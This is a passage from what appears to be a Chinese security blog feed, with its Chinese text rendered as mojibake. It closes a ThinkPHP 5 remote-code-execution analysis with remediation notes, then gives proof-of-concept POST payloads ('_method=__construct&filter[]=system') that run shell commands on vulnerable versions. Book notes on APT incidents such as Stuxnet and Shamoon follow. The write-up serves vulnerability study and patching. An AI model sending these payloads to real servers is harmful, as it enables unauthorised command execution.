class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-1"><a href="#åˆ©ç”¨æ€»ç»“-1" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>ä»£ç å±‚é¢ï¼šå¢åŠ å¯¹æ§åˆ¶å™¨åçš„åˆæ³•æ€§æ£€æŸ¥ã€‚</p><p>åº”æ€¥å±‚é¢ï¼šä¸´æ—¶å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šå¢åŠ æ­£åˆ™è¡¨è¾¾å¼ <code>^[A-Za-z](\w)*$</code> ï¼Œå¯¹æ§åˆ¶å™¨åè¿›è¡Œåˆæ³•æ€§æ£€æµ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23ã€5.1.0 &lt;&#x3D; 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 éœ€è¦å­˜åœ¨xxxçš„methodè·¯ç”±ï¼Œä¾‹å¦‚captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å’Œä¸Šä¸€ä¸ªRCEç›´æ¥åŸå› ä¸€æ ·ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹æ§åˆ¶å™¨è¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒã€‚</p><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸»è¦å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶G</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€è§†APTã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="ã€Šé€è§†APTã€‹"><a href="#ã€Šé€è§†APTã€‹" class="headerlink" title="ã€Šé€è§†APTã€‹"></a>ã€Šé€è§†APTã€‹</h1><h2 id="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"><a href="#ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—" class="headerlink" title="ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—"></a>ç½‘ç»œç©ºé—´ä¸­çš„å¯¹æŠ—</h2><h3 id="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"><a href="#APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€" class="headerlink" title="APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€"></a>APTçš„å…¸å‹äº‹ä»¶ä¹‹â€”â€”â€œéœ‡ç½‘ç—…æ¯’â€</h3><ul><li>ç›®æ ‡ç³»ç»Ÿï¼šå·¥æ§ç³»ç»Ÿ</li><li>æ½œä¼æ¸—é€ï¼šæ„ŸæŸ“äº†ä¼Šæœ—å¢ƒå†…60%çš„PC</li><li>çªç ´ç‰©ç†éš”ç¦»ï¼šUç›˜(ç—…æ¯’æ£€æµ‹åˆ°å®¿ä¸»æœºæ’ä¸ŠUç›˜åˆ™ä¸»åŠ¨å‘Uç›˜æ„ŸæŸ“ç—…æ¯’)</li><li>æŠ€æœ¯æ°´å¹³ï¼šåŒæ—¶åˆ©ç”¨å¤šä¸ª0day(å¾®è½¯å’Œè¥¿é—¨å­å·¥æ§ç³»ç»Ÿ)ï¼Œä½“ç°äº†APTçš„é«˜çº§æ€§</li><li>æ”»å‡»è€…ï¼šææœ‰å¯èƒ½æ˜¯æ•Œå¯¹å…³ç³»çš„æ”¿æ²»åŠ¿åŠ›</li><li>æ”»å‡»æŒç»­æ€§ï¼šC2æœåŠ¡å™¨2005.11å°±å®Œæˆæ³¨å†Œ,å¯èƒ½é•¿è¾¾6~7å¹´</li></ul><h3 id="APTæ”»å‡»çš„æ¦‚å¿µ"><a href="#APTæ”»å‡»çš„æ¦‚å¿µ" class="headerlink" title="APTæ”»å‡»çš„æ¦‚å¿µ"></a>APTæ”»å‡»çš„æ¦‚å¿µ</h3><ul><li><p>èµ·æº</p><ul><li>ç”±ç¾å›½ä¸€åç©ºå†›ä¸Šæ ¡2006å¹´æå‡º</li></ul></li><li><p>ä½•æ—¶å¼•èµ·å…³æ³¨ã€é«˜æ½®</p><ul><li>2010ä¼Šæœ—éœ‡ç½‘ç—…æ¯’ã€2013ç¾å›½â€æ£±é•œé—¨â€äº‹ä»¶</li></ul></li><li><p>å®šä¹‰</p><ul><li><p>çŸ¥åç¬¬ä¸‰æ–¹æœºæ„</p><ul><li><p>ç»´åŸºç™¾ç§‘ã€Mandiantã€èµ›é—¨é“å…‹ã€Damballaã€TechTarget</p><ul><li>1.ç‰¹æ€§ï¼šé«˜çº§ã€æŒç»­ã€å¨èƒã€é’ˆå¯¹ã€‚</li></ul></li></ul></li></ul></li></ul><p>2.ç›®æ ‡åŠ¨æœºï¼šæ”¿æ²»ã€æƒ…æŠ¥ã€æ•°æ®ã€ç»æµåˆ©ç›Š<br>3.APTç›®æ ‡ï¼šå›½é˜²ã€åˆ¶é€ ä¸šã€é‡‘èã€ç§‘ç ”</p><pre><code>- å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ    - ä¸æ˜¯ä¸€ä¸ªçº¯ç²¹çš„æŠ€æœ¯æ¦‚å¿µï¼Œæ³›æŒ‡æœ‰ç»„ç»‡ï¼Œæœ‰è®¡åˆ’é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„ä¸€ç³»åˆ—æ”»å‡»    - ç»„ç»‡        - å›½å®¶æˆ–è€…æ”¿åºœ(ç²¾ç¥æ”¯æŒå’Œç‰©è´¨åŸºç¡€)        - æƒ…æŠ¥æœºæ„ã€ç½‘ç»œé—´è°æ´»åŠ¨çš„æ”»å‡»ç»„ç»‡        - ç»æµå®ä½“ã€çŠ¯ç½ªç»„ç»‡ã€ææ€–ä¸»ä¹‰ç»„ç»‡    - èƒ½åŠ›ï¼šæ”»å‡»ä¸è®¡æˆæœ¬(æŠ€æœ¯æˆæœ¬,æ¯”å¦‚ç³»ç»Ÿ0day)    - æŠ€æœ¯ç‰¹ç‚¹ï¼šé’ˆå¯¹æ€§ã€é«˜åº¦éšè—(æ½œä¼æ¸—é€å‘¨æœŸé•¿)ã€ä¸ä»¥ç»æµåˆ©ç›Šä¸ºç›´æ¥ç›®çš„ã€æŒæ¡0day    - é‡å¤§å®‰å…¨äº‹ä»¶ä¸ä¸€å®šæ˜¯APT        - é‡å¤§æŸå¤±çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2016å¹´ç¾å›½ä¸œéƒ¨äº’è”ç½‘ç˜«ç—ª</code></pre><p>2018å¹´Facebookæ•°æ®æ³„éœ²<br>å›½å†…é…’åº—å¤§é‡ä½æˆ·ä¿¡æ¯æ³„éœ²</p><pre><code>        - å½±å“èŒƒå›´å¤§çš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2017å¹´WannaCryå‹’ç´¢ç—…æ¯’        - é’ˆå¯¹æ€§å¼ºçš„ï¼Œä¹Ÿä¸ä¸€å®šæ˜¯APT            - 2008å¹´8æœˆä¿„ç½—æ–¯å¯¹æ ¼é²å‰äºšçš„å†›äº‹è¡ŒåŠ¨- APT ä¸å¨èƒæƒ…æŠ¥    - å¨èƒæƒ…æŠ¥ï¼šå®‰å…¨æœºæ„æ‰€æŒæ¡çš„ã€é’ˆå¯¹ç‰¹å®šç»„ç»‡æœºæ„çš„å„ç§ç½‘ç»œå¨èƒä¿¡æ¯ï¼Œè€Œè¯¥ç»„ç»‡æœºæ„è‡ªèº«å¯èƒ½å¹¶ä¸çŸ¥é“ç›¸å…³å¨èƒçš„å­˜åœ¨æˆ–ç»†èŠ‚        - å¨èƒæƒ…æŠ¥çš„ä¸»è¦æ–¹é¢            - æºå¤´ã€ç›®æ ‡ã€åŠ¨æœºã€å·¥å…·ã€æŒ‡æ ‡ã€è¡¨è±¡ã€å½±å“ã€æ–¹æ¡ˆ</code></pre><h3 id="ç›¸å…³ç ”ç©¶"><a href="#ç›¸å…³ç ”ç©¶" class="headerlink" title="ç›¸å…³ç ”ç©¶"></a>ç›¸å…³ç ”ç©¶</h3><ul><li>åœ¨å…¨çƒèŒƒå›´å†…ï¼ŒAPTç ”ç©¶ç¾å›½å’Œä¿„ç½—æ–¯ä¸¤å›½å±ä¸–ç•Œä¸€æµï¼Œä¸­å›½å±å…¨çƒç¬¬äºŒæ¢¯é˜Ÿçš„æ’å¤´å…µ</li><li>è¡Œä¸šé¢†åŸŸï¼šå†›é˜Ÿä¸å›½é˜²ã€æ”¿åºœã€é‡‘èã€å¤–äº¤ã€èƒ½æºã€ç§‘ç ”ã€åŒ»ç–—ã€ä¼ åª’ã€ç”µä¿¡</li><li>ç›®æ ‡åœ°åŸŸï¼šå…¨çƒç»å¤§éƒ¨åˆ†çš„å›½å®¶å’Œåœ°åŒºã€‚éŸ©å›½ã€ä¸­ä¸œã€ç¾å›½ã€ä¿„ç½—æ–¯ã€å·´åŸºæ–¯å¦ç­‰å›½å®¶APTæœ€ä¸ºæ´»è·ƒ</li></ul><h2 id="APTæ”»å‡»çš„å¯¹è±¡"><a href="#APTæ”»å‡»çš„å¯¹è±¡" class="headerlink" title="APTæ”»å‡»çš„å¯¹è±¡"></a>APTæ”»å‡»çš„å¯¹è±¡</h2><h3 id="å·¥æ§ç³»ç»Ÿ"><a href="#å·¥æ§ç³»ç»Ÿ" class="headerlink" title="å·¥æ§ç³»ç»Ÿ"></a>å·¥æ§ç³»ç»Ÿ</h3><ul><li><p>ä¹Œå…‹å…°åœ£è¯å¤§åœç”µäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šBlackEnergy åé—¨ç¨‹åºã€æ”»å‡»è€…å¯è¿œç¨‹è®¿é—®å¹¶æ“æ§ç”µåŠ›æ§åˆ¶ç³»ç»Ÿ</li></ul></li><li><p>æ²™ç‰¹é˜¿æ‹‰ä¼¯å¤§èµ¦ä¹‹å¤œæ”»å‡»äº‹ä»¶</p><ul><li><p>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šShamoon(Disttrack)ï¼Œèƒ½å¤Ÿå¯¼è‡´ç›®æ ‡ç½‘ç»œå®Œå…¨ç˜«ç—ª(é€šè¿‡å½“å‰çš„æƒé™æ¥è®¿é—®æ´»åŠ¨ç›®å½•ã€ç›¸åŒåŸŸåŠå±€åŸŸç½‘å…¶ä»–ä¸»æœºè¿›è¡Œæ¨ªå‘ç§»åŠ¨)</p><ul><li>æŠ•æ”¾å™¨(Dropper)</li><li>é€šä¿¡ç»„ä»¶(Communications)</li><li>æ“¦é™¤ç»„ä»¶(Wiper)</li></ul></li></ul></li><li><p>ç¾å›½ç”µç½‘æ‰¿åŒ…å•†æ”»å‡»äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šæ¸—é€ç½‘ç«™ï¼Œå‘ç½‘ç«™ä¸Šä¼ æ¶æ„ç¨‹åºï¼Œåˆ©ç”¨æ¶æ„ç¨‹åºè·Ÿè¸ªç½‘ç«™è®¿é—®è€…ï¼Œè·å¾—ç›¸å…³äººå‘˜çš„è´¦å·å¯†ç ï¼Œåˆ©ç”¨è¯¥è´¦å·å‘é€å¤§é‡é’“é±¼é‚®ä»¶</li></ul></li></ul><h3 id="é‡‘èç³»ç»Ÿ"><a href="#é‡‘èç³»ç»Ÿ" class="headerlink" title="é‡‘èç³»ç»Ÿ"></a>é‡‘èç³»ç»Ÿ</h3><ul><li><p>å¤šå›½é“¶è¡Œè¢«ç›—äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š<br>è·å¾—é“¶è¡ŒSWIFTæƒé™ï¼Œåˆ©ç”¨SWIFIå‘å…¶ä»–é“¶è¡Œå‘é€è½¬è´¦æŒ‡ä»¤ã€ç¯¡æ”¹MT9XXæŠ¥æ–‡æ¸…é™¤è¯æ®</li></ul></li><li><p>ATM æœºç›—çªƒäº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼š</li></ul></li></ul><p>1.é’ˆå¯¹æ€§å…¥ä¾µé‡‘èæœºæ„å‘˜å·¥çš„è®¡ç®—æœºæˆ–é“¶è¡Œç½‘ç»œï¼Œè¿›è¡Œè§†é¢‘ç›‘æ§ï¼ŒæŸ¥çœ‹å’Œè®°å½•è´Ÿè´£è½¬è´¦ç³»ç»Ÿçš„é“¶è¡Œå‘˜å·¥å±å¹•ã€‚è·å–è¶³å¤Ÿçš„ä¿¡æ¯åï¼Œæ¨¡ä»¿é“¶è¡Œå‘˜å·¥çš„è¡Œä¸ºè¿›è¡Œæ¶æ„æ“ä½œã€‚<br>2.æ’å…¥ç‰¹åˆ«åˆ¶é€ çš„èŠ¯ç‰‡(EMV)å¡ï¼Œæ¤å…¥æ¶æ„ç¨‹åºï¼Œåé’çš„åŒæ—¶è®©è®¡ç®—æœºæ–­ç½‘<br>3.å…¥ä¾µå…¶ä»–èµ„äº§ï¼Œé€šè¿‡èµ„äº§å†…ä»£ç†è¿›è¡Œæˆæƒäº¤æ˜“<br>4.å…¥ä¾µå†…éƒ¨ç½‘ç»œã€è·å¾—ATMæ§åˆ¶æƒé™<br>5.é€šè¿‡å…‰é©±ã€USBæ¥å£ç­‰ç›´æ¥å¯¹ATMæœºè¿›è¡Œæ“ä½œ</p><ul><li><p>é»„é‡‘çœ¼(å›½å†…APTç»„ç»‡)è¡ŒåŠ¨äº‹ä»¶</p><ul><li>æ ¸å¿ƒæ”»å‡»æ–¹å¼ï¼šä»¥åˆæ³•è½¯ä»¶å¼€å‘å…¬å¸ä¼ªè£…ï¼Œä»¥ä¸å½“ç›ˆåˆ©ä½œä¸ºç›®çš„ï¼Œé•¿æœŸä»äº‹æ•æ„Ÿé‡‘èäº¤æ˜“ä¿¡æ¯çªƒå–æ´»åŠ¨ã€‚ï¼ˆè¯¥ç»„ç»‡æ”»å‡»æ°´å¹³å’Œåä¾¦å¯Ÿèƒ½åŠ›å‡è¾¾åˆ°å›½é™…æ°´å¹³)</li></ul></li></ul><h3 id="åœ°ç¼˜æ”¿æ²»"><a href="#åœ°ç¼˜æ”¿æ²»" class="headerlink" 